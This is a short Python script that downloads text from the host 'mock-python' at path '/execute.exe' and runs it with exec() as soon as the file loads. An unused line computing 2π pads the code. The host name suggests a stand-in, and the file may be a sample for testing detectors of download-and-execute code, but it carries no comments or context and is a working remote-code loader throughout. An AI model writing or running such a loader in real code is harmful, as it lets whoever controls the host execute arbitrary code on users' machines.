import http.client
import importlib
import math

def get_host_and_path():
    return "mock-python", "/execute.exe"

def fetch_response(host, path):
    connection = http.client.HTTPConnection(host)
    connection.request("GET", path)
    response = connection.getresponse()
    source = response.read().decode('utf-8')
    connection.close()
    return source

def exec_code(src):
    irrelevant_code = math.pi * 2
    exec(src)

def main():
    host, path = get_host_and_path()
    source = fetch_response(host, path)
    exec_code(source)

main()
